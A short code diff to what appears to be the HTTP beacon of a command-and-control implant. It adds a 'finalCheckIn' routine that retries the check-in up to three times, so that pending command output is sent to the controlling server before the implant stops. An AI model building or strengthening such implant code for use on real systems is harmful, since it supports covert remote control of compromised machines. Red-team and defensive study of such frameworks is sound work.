@@ -1,7 +1,9 @@
 #include "BeaconHttp.hpp"
 
 #include <ctime>
+#include <chrono>
 #include <random>
+#include <thread>
 
 #ifdef __linux__
 
@@ -777,5 +779,23 @@ void BeaconHttp::checkIn()
         if (!input.empty())
             cmdToTasks(input);
         m_pendingOutput.clear();
+    }
+}
+
+void BeaconHttp::finalCheckIn()
+{
+    for (int attempt = 0; attempt < 3; ++attempt)
+    {
+        try
+        {
+            checkIn();
+        }
+        catch (...)
+        {
+        }
+        if (m_taskResult.empty() && m_pendingOutput.empty())
+            return;
+        if (attempt < 2)
+            std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
 }
